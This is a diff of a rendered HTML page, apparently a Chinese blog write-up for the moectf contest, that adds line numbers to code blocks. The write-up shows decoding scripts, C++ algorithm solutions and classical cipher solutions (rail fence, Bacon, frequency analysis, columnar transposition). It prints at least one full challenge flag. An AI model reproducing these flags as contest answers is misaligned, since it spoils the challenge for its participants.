 </span></span><span class="line"><span class="cl"><span class="n">b16</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;F#&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0`&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MQ==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;31&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GE======&#39;</span><span class="p">]</span>
@@ -580,7 +1190,9 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;ERROR OR SUCCESS!&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"> <span class="n">exit</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"> <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;secret.txt&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl"> <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">[</span><span class="n">point</span><span class="p">](</span><span class="n">s</span><span class="p">[</span><span class="n">n</span><span class="o">+</span><span class="mi">6</span><span class="p">:])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span></span></span></code></pre></div><p>然后!!! 我就迷茫了&hellip; 无论如何都匹配不上.. 循环只执行一遍不做任何处理就会退出..</p>
+</span></span><span class="line"><span class="cl"> <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">[</span><span class="n">point</span><span class="p">](</span><span class="n">s</span><span class="p">[</span><span class="n">n</span><span class="o">+</span><span class="mi">6</span><span class="p">:])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后!!! 我就迷茫了&hellip; 无论如何都匹配不上.. 循环只执行一遍不做任何处理就会退出..</p>
 <p>于是&hellip; 怎么能放弃呢?!</p>
 <p>我就改动了一下, 把循环去掉, 然后人眼识别, 手动修改解码方式和位置&hellip; 手撕了三十一层, 得到<code>flag</code>.</p>
 <h3 class="heading-element" id="tree-distance"><span>Tree Distance</span>
@@ -590,7 +1202,88 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </h3><p>想让我写算法解释吗? 不可能的&hellip; 我还想多活几年&hellip; 我把代码放出来吧&hellip;</p>
 <p>算法是倍增求LCA, 可以百度了解一下.</p>
 <p>( 其实本题最开始是网络版的, 网络版数据简单得多并且没有时间限制, 可惜我不会网络编程, 于是就走上了OJ这条不归之路 T_T , 数据太坑人了 )</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">// 再过不了我就换地方重写QAQ
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">// 再过不了我就换地方重写QAQ
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##include &lt;cstdio&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cstring&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
@@ -666,13 +1359,106 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">WDNMD</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h3 class="heading-element" id="f1gs-diamond"><span>F1@g‘s diamond</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 class="heading-element" id="f1gs-diamond"><span>F1@g‘s diamond</span>
  <a href="#f1gs-diamond" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>代码一扔我就溜~</p>
 <p>算法是线段树, 区间维护.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include&lt;cstdio&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include&lt;cstdio&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cstring&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;iostream&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
@@ -758,7 +1544,9 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h2 class="heading-element" id="crypto"><span>Crypto</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="crypto"><span>Crypto</span>
  <a href="#crypto" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
@@ -771,18 +1559,56 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
  <a href="#rail-fence-cipher" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mthAf2p_anf@ccta}ofEi3_hl_d_sar0pe{_Lncesk_cslyghctr_c12_i0li_pry</span></span></code></pre></div><p>栅栏密码, 必应了解了一下, 发现分组, 然后就找了一下o, 通过o的判断发现分组的奥妙:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mthAf2p_anf@ccta}
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mthAf2p_anf@ccta}ofEi3_hl_d_sar0pe{_Lncesk_cslyghctr_c12_i0li_pry</span></span></code></pre></td></tr></table>
+</div>
+</div><p>栅栏密码, 必应了解了一下, 发现分组, 然后就找了一下o, 通过o的判断发现分组的奥妙:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mthAf2p_anf@ccta}
 </span></span><span class="line"><span class="cl">ofEi3_hl_d_sar0p
 </span></span><span class="line"><span class="cl">e{_Lncesk_cslygh
-</span></span><span class="line"><span class="cl">ctr_c12_i0li_pry</span></span></code></pre></div><p>然后竖着读就可以找到<code>flag</code>啦. <code>flag</code>: <code>moectf{thE_rAiL_f3nc2_c1phe2_ls_a_kind_0f_cl@ssical_crypt0graphy}</code></p>
+</span></span><span class="line"><span class="cl">ctr_c12_i0li_pry</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后竖着读就可以找到<code>flag</code>啦. <code>flag</code>: <code>moectf{thE_rAiL_f3nc2_c1phe2_ls_a_kind_0f_cl@ssical_crypt0graphy}</code></p>
 <h3 class="heading-element" id="bacons-cipher"><span>Bacon’s Cipher</span>
  <a href="#bacons-cipher" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">AqCEclcIZQjbecyOhgXSwOdveKjpYyaeknUkyokazpyUnhFDSmvQEvCdmoFsfAvfyvTQFWkyBNIojUddNbtmT</span></span></code></pre></div><p>这道题居然是以大小写来隐藏信息的!!!</p>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">AqCEclcIZQjbecyOhgXSwOdveKjpYyaeknUkyokazpyUnhFDSmvQEvCdmoFsfAvfyvTQFWkyBNIojUddNbtmT</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这道题居然是以大小写来隐藏信息的!!!</p>
 <p>然后就有了下面这个程序:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cctype&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
@@ -791,11 +1617,27 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">isupper</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="k">else</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>运行一下, 得到了一串二进制: <code>0100111000111110110010111011011111011111111011000110010111011011110000110001101101110</code></p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行一下, 得到了一串二进制: <code>0100111000111110110010111011011111011111111011000110010111011011110000110001101101110</code></p>
 <p>手动分割一下:</p>
 <p><code>01001 11000 11111 01100 10111 01101 11110 11111 11101 10001 10010 11101 10111 10000 11000 11011 01110</code></p>
 <p>发现解密的不对! <code>11111</code>太夸张了&hellip;然后改一下代码,</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cctype&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
@@ -804,14 +1646,50 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">isupper</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="k">else</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>再运行, 得到了另一串二进制 ( 其实就是上面的结果的按位非运算 )</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>再运行, 得到了另一串二进制 ( 其实就是上面的结果的按位非运算 )</p>
 <p><code>10110 00111 00000 10011 01000 10010 00001 00000 00010 01110 01101 00010 01000 01111 00111 00100 10001</code>, 对着字母序号表解出<code>flag</code>.</p>
 <h3 class="heading-element" id="frequency-analysis"><span>Frequency analysis?</span>
  <a href="#frequency-analysis" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>一看题目, 频率分析啊&hellip; 我不能当工具人! 于是写一程序:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;map&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;algorithm&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
@@ -840,7 +1718,9 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">types</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">frequent</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;%</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>然后打开结果的文件, 再复制拖到<code>Excel</code>里面, 然后根据频率大小排序, 然后从上往下读就得到<code>flag</code>了&hellip;</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后打开结果的文件, 再复制拖到<code>Excel</code>里面, 然后根据频率大小排序, 然后从上往下读就得到<code>flag</code>了&hellip;</p>
 <h3 class="heading-element" id="md5"><span>MD5</span>
  <a href="#md5" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -858,20 +1738,58 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
  </a>
 </h3><p>In a columnar transposition, the message is written out in rows of a fixed length, and then read out again column by column, and the columns are chosen in some scrambled order. Both the width of the rows and the permutation of the columns are usually defined by a keyword. For example, the keyword <code>ZEBRAS</code> is of length 6 (so the rows are of length 6), and the permutation is defined by the alphabetical order of the letters in the keyword. In this case, the order would be &ldquo;6 3 2 4 1 5&rdquo;.</p>
 <p>In a regular columnar transposition cipher, any spare spaces are filled with nulls; in an irregular columnar transposition cipher, the spaces are left blank. Finally, the message is read off in columns, in the order specified by the keyword. For example, suppose we use the keyword <code>ZEBRAS</code> and the message <code>WE ARE DISCOVERED. FLEE AT ONCE</code>. In a regular columnar transposition, we write this into the grid as follows:</p>
-<pre tabindex="0"><code>6 3 2 4 1 5
-W E A R E D
-I S C O V E
-R E D F L E
-E A T O N C
-E Q K J E U</code></pre><p>providing five nulls (<code>QKJEU</code>), these letters can be randomly selected as they just fill out the incomplete columns and are not part of the message. The ciphertext is then read off as:</p>
-<pre tabindex="0"><code>EVLNE ACDTK ESEAQ ROFOJ DEECU WIREE</code></pre><p>In the irregular case, the columns are not completed by nulls:</p>
-<pre tabindex="0"><code>6 3 2 4 1 5
-W E A R E D
-I S C O V E
-R E D F L E
-E A T O N C
-E</code></pre><p>This results in the following ciphertext:</p>
-<pre tabindex="0"><code>EVLNA CDTES EAROF ODEEC WIREE</code></pre><p>To decipher it, the recipient has to work out the column lengths by dividing the message length by the key length. Then he can write the message out in columns again, then re-order the columns by reforming the key word.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">6 3 2 4 1 5
+</span></span><span class="line"><span class="cl">W E A R E D
+</span></span><span class="line"><span class="cl">I S C O V E
+</span></span><span class="line"><span class="cl">R E D F L E
+</span></span><span class="line"><span class="cl">E A T O N C
+</span></span><span class="line"><span class="cl">E Q K J E U</span></span></code></pre></td></tr></table>
+</div>
+</div><p>providing five nulls (<code>QKJEU</code>), these letters can be randomly selected as they just fill out the incomplete columns and are not part of the message. The ciphertext is then read off as:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">EVLNE ACDTK ESEAQ ROFOJ DEECU WIREE</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the irregular case, the columns are not completed by nulls:</p>
+<div class="highlight"><div class="chroma">
